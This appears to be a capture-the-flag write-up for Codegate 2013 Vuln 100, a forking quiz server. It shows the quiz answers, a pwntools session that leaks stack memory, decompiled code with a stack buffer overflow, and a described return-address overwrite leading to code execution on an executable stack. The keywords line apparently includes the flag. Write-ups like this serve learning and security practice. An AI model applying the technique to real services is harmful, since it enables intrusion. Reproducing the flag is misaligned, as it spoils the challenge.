# Codegate 2013 Vuln 100 Writeup

## Initial Investigation

Simple forking server listens on port 6666.

    $ checksec.sh --file ./94dd6790cbf7ebfc5b28cc289c480e5e
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./94dd6790cbf7ebfc5b28cc289c480e5e

After answering some trivia, it asks for your name.

    $ nc localhost 6666
    Welcome to CODEGATE2013.
    This is quiz game.
    Solve the quiz.

    It is Foot Ball Club. This Club is an English Primier league football club. This Club founded 1886. This club Manager Arsene Wenger. This club Stadium is Emirates Stadium. What is this club? (only small letter)
    arsenal
    good!1
    It is a royal palace locate in northern Seoul, South Korea. First constructed in 1395, laster burned and abandoned for almost three centuries, and then reconstructed in 1867, it was the main and largest place of the Five Grand Palaces built by the joseon Dynasty. What is it?(only small letter)
    gyeongbokgung
    good!2
    He is South Korean singer, songwriter, rapper, dancer and record producer. He is known domestically for his humorous videos and stage performances, and internationally for his hit single Gangnam Style. Who is he?(only small letter)
    psy
    good!3
    rank write! your nickname:
    ebeip90
    ebeip9 very good ranke
    game the end

The thing to note immediately is that the name was truncated.  `nc` will wait until you hit enter to send the data, and terminate it with `'\n\x00'`.  Let's try this again in Python.
This example makes use of pwnies' [pwntools](https://github.com/pwnies/pwntools), see their github repo for more information.

```python
from pwn import *
r = remote('localhost',6666)
>>> [+] Opening connection to localhost on port 6666: Done
r.sendline('arsenal')
r.recvrepeat()
>>> [+] Recieving all data: Done
r.sendline('gyeongbokgung')
r.recvrepeat()
>>> [+] Recieving all data: Done
r.sendline('psy')
r.recvrepeat()
>>> [+] Recieving all data: Done
r.sendline('A\x00')
print hexdump(r.recvrepeat())
00000000  41 00 7c 40 ff 7f 00 00   a0 98 ae ed 52 7f 00 00  |A.|@........R...|
00000010  00 00 00 00 00 00 00 00   40 7e 7c 40 ff 7f 00 00  |........@~|@....|
00000020  90 0a 40 00 00 00 00 00   40 a7 e9 ed 52 7f 00 00  |..@.....@...R...|
...
```

## Reverse Engineering the Binary

Awesome, looks liek we're leaking data over the connection.  Let's take a look in IDA.
After getting past the trivia logic, we see the following code.

```c
// 0401133:
send("good!3\n", 7);
send("rank write! your nickname:\n", 0x1c);
recv(buffer, 0x800);
recv(buffer, 0x800);
sub_400C69(buffer);
```

It looks something like this:

```c
void sub_400C69(char* userInput) {
    char buffer[0x108];
    char* p_buffer = buffer;

    // Stack buffer overflow!
    memcpy(buffer, userInput, strlen(userInput));
    strcpy(p_buffer, buffer)

    g_buffer = p_buffer;
}
```

After returning from `sub_400C69`, we send the user back their name:

```c
send(sock, g_buffer, strlen(g_buffer)-1); // Leak!
send(sock, " very good ranker ", ...);
send(sock, "\ngame the end\n", ...)''
```

So far we have two distinct bugs -- `strlen(input)-1` and an unchecked memcpy of controlled
input into a stack buffer.  The stack is executeable, and since this is a forking server,
the stack addresses will not change in between runs.


## Exploitation

Exploitation will be two-step:

1. Find the stack address by sending a very short name string to dump the stack.
2. Send a crafted buffer to overflow the strcpy() destination pointer, and point
   it at <our buf+X>, where <X> is the number of bytes between the destination
   pointer and the return address.
   The memcpy() will overwrite the destination pointer, and the strcpy()
   will overwrite the return address.
   This will cause our buffer to start execution at offset +X.

**Keywords**: codegate 2013 vuln vuln100 vulnerability exploit Very_G00d_St6rt!!_^^